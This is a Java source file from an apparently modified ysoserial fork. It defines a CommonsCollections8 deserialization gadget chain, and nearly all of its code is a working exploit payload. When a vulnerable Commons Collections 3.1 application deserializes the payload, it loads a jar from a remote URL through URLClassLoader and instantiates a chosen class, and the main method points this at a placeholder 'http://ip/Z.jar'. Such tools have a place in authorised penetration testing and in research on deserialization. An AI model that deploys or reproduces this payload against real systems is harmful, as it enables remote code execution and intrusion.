package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.omg.CosNaming.NamingContextExtPackage.StringNameHelper;
import org.python.antlr.ast.Str;
import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
    by @matthias_kaiser
*/

/**
 * Author: @Jayl1n
 * 加载远程jar，需要accessDeclaredMembers权限
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.MATTHIASKAISER})
public class CommonsCollections8 extends PayloadRunner implements ObjectPayload<Serializable> {

    public Serializable getObject(final String args) throws Exception {

        int indexOfFirstSpace = args.indexOf(" ");
        String url = "";
        String c = "";
        if (indexOfFirstSpace != -1) {
            url = args.substring(0, indexOfFirstSpace);
            c = args.substring(indexOfFirstSpace+1);
        }

        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(java.net.URLClassLoader.class),
            // getConstructor class.class classname
            new InvokerTransformer("getConstructor",
                new Class[]{Class[].class},
                new Object[]{new Class[]{java.net.URL[].class}}),
            new InvokerTransformer(
                "newInstance",
                new Class[]{Object[].class},
                new Object[]{new Object[]{new java.net.URL[]{new java.net.URL(url)}}}),
            // loadClass String.class R
            new InvokerTransformer("loadClass",
                new Class[]{String.class}, new Object[]{c}),
            // set the target reverse ip and port
            new InvokerTransformer("getConstructor",
                new Class[]{Class[].class},
                new Object[]{new Class[]{String.class}}),
            // invoke
            new InvokerTransformer("newInstance",
                new Class[]{Object[].class},
                new Object[]{new String[]{"whoami"}}),
            new ConstantTransformer(1)};

        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }


        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        keyField.setAccessible(true);
        keyField.set(node, entry);

        return map;

    }

    public static void main(final String[] args) throws Exception {
        String[] args1 = new String[]{"http://ip/Z.jar X"};

        PayloadRunner.run(CommonsCollections8.class, args1);

        //Serializable object = new CommonsCollections8().getObject(args1);
        //byte[] serialize = Serializer.serialize(object);
        //String x = Base64.getEncoder().encodeToString(serialize);
        //System.out.println(x);
//        Deserializer.deserialize(serialize);
    }
}
